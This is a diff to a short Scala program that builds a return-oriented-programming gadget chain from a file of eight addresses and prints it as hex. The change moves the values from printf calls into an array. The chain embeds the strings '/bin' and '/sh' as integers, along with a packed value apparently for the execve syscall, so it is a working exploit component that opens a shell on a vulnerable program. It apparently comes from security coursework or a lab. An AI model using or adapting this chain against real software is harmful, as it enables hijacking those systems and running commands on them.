@@ -8,27 +8,33 @@ object GadgetChainBuilder {
     // val outfile: String = args(1)
 
     val addresses = new Array[Long](8)
+    val chain = new Array[Long](16)
+
     var i: Int = 0
     for (line <- Source.fromFile(filename).getLines) {
       addresses(i) = java.lang.Long.parseLong(line.toUpperCase, 16)
       i += 1;
     }
 
-    printf("%d ", addresses(1))
-    printf("%d ", addresses(2))
-    printf("%d ", 185273099)
-    printf("%d ", addresses(0) + 28)
-    printf("%d ", addresses(3))
-    printf("%d ", addresses(4))
-    printf("%d ", addresses(5))
-    printf("%d ", addresses(0) + 56)
-    printf("%d ", addresses(6))
-    printf("%d ", addresses(0) + 48)
-    printf("%d ", addresses(0) + 52)
-    printf("%d ", addresses(7))
-    printf("%d ", addresses(0) + 56)
-    printf("%d ", 0)
-    printf("%d ", 1852400175)
-    printf("%d ", 6845231)
+    chain(0) = addresses(1)
+    chain(1) = addresses(2)
+    chain(2) = 185273099
+    chain(3) = addresses(0) + 28
+    chain(4) = addresses(3)
+    chain(5) = addresses(4)
+    chain(6) = addresses(5)
+    chain(7) = addresses(0) + 56
+    chain(8) = addresses(6)
+    chain(9) = addresses(0) + 48
+    chain(10) = addresses(0) + 52
+    chain(11) = addresses(7)
+    chain(12) = addresses(0) + 56
+    chain(13) = 0
+    chain(14) = 1852400175
+    chain(15) = 6845231
+
+    for (gadget <- chain) {
+      println(gadget.toHexString)
+    }
   }
 }
